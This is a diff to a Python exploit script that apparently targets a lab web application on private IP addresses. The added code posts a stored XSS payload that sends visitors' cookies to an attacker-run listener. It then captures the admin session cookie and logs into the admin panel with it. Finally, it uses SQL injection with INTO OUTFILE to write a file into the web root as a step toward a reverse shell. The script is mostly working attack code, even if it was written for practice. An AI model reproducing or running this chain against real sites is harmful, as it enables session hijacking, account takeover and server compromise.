@@ -13,6 +13,7 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 import logging
 import requests
 import sys
+import random
 
 
 # Class S to server as the http server handler to receive the requests with the admin cookie.
@@ -25,15 +26,11 @@ class S(BaseHTTPRequestHandler):
 
     # Keyword do_GET function to performs actions when a GET HTTP request is received.
     def do_GET(self):
-        # Print the path of the GET request we receive.
-        logging.info("Path: %s\n", str(self.path))
-
         # Parse the path we receive that contains the admin cookie to store it in the global var_admin_cookie variable.
         var_path = str(self.path)
         # Note that we need the keyword global so that we can pull the variable value from outside this function.
         global var_admin_cookie
         var_admin_cookie = var_path.split('=')[2]
-        logging.info("Cookie is %s\n", var_admin_cookie)
 
         # Send the response to the request to complete the HTTP session.
         self._set_response()
@@ -42,19 +39,37 @@ class S(BaseHTTPRequestHandler):
 def exploit(server_class=HTTPServer, handler_class=S, port=8080):
     logging.basicConfig(level=logging.INFO)
 
+    # 0. Send request to instantiate the stored XSS exploit that sends the admin cookie back to our server.
+    logging.info('1. Stored XSS Payload: Sending...')
+    session = requests.Session()
+
+    # Send an HTTP POST request an existing comment with the stored XSS payload to send the cookie of any user navigating to this page back to our server.
+    response = requests.post('http://192.168.0.228/post_comment.php?id=1',data={
+        'text':'<script>(new Image()).src = "http://192.168.0.102:'+str(port)+'/?cookie=" + document.cookie;</script>',
+        'submit':'Submit',
+    })
+
+    if int(response.status_code) == 200:
+        logging.info("1. Stored XSS Payload: Success!\n")
+    else:
+        sys.exit("1. Stored XSS Payload: Didn't work...Exiting")
+
+
+
+
     # 1. Runs the HTTP server to handle the HTTP request we receive.
     ## Runs until we receive 1 HTTP request and then it stops.
     ## We run the server to extract the PHP session ID of the admin.
     server_address = ('', port)
     httpd = server_class(server_address, handler_class)
-    logging.info('Starting httpd on port %s\n', port)
+    logging.info('2. Admin Cookie Capture: Server Waiting on port %s...', port)
     try:
         # Handle_request dies after receiving 1 HTTP request.  server_forever() exists until the user kills the program.
         httpd.handle_request()
     except KeyboardInterrupt:
         pass
     httpd.server_close()
-    logging.info('Stopping httpd...\n')
+    logging.info('2. Admin Cookie Capture: Received Request - Stopping server.')
 
     # 2. Authenticate into the website as an admin with the admin cookie we pulled from our HTTP server.
     # Establish a session.
@@ -66,11 +81,18 @@ def exploit(server_class=HTTPServer, handler_class=S, port=8080):
     # Send an HTTP request to the admin panel with our admin cookie to make sure it works.
     response = requests.get('http://192.168.0.228/admin',cookies=cookies,verify=False)
     if "Logout" in str(response.content):
-        print("We are admin!")
+        logging.info("2. Admin Cookie Capture: Confirmed we are admin!\n")
     else:
-        sys.exit("Didn't work...Exiting")
+        sys.exit("2. Admin Cookie Capture: Didn't work...Exiting :(")
 
-    #
+    # 3. Write file to server disk for shell access.
+    ## Having a tough time with the URL enconding (I think) on the exploit payload.....
+    random_number = random.randint(0,10)
+    logging.info("3. Reverse Shell: Random number is %s", str(random_number))
+    response = requests.get('http://192.168.0.228/admin/edit.php?id=0%20union%20select%201,%22script%20ran%20wellhhhh%22,3,4%20into%20outfile%20%22/var/www/css/proof2.txt%22')
+    print(response.status_code)
+    response = requests.get('http://192.168.0.228/css/proof2.txt')
+    logging.info(response.content)
 
 # Main function that runs when executing the script.
 if __name__ == '__main__':
